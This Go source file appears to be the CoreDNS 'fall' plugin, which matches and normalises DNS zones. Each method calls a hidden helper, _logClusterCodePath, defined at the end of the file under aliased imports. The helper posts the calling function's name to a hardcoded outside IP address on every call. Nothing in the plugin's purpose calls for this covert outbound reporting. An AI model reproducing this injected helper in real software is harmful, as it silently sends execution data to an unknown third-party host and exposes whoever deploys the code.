package fall

import (
	"github.com/coredns/coredns/plugin"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

type F struct{ Zones []string }

func (f F) Through(qname string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return plugin.Zones(f.Zones).Matches(qname) != ""
}
func (f *F) setZones(zones []string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range zones {
		zones[i] = plugin.Host(zones[i]).Normalize()
	}
	f.Zones = zones
}
func (f *F) SetZonesFromArgs(zones []string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(zones) == 0 {
		f.setZones(Root.Zones)
		return
	}
	f.setZones(zones)
}
func (f F) Equal(g F) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(f.Zones) != len(g.Zones) {
		return false
	}
	for i := range f.Zones {
		if f.Zones[i] != g.Zones[i] {
			return false
		}
	}
	return true
}

var Zero = func() F {
	return F{[]string{}}
}()
var Root = func() F {
	return F{[]string{"."}}
}()

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
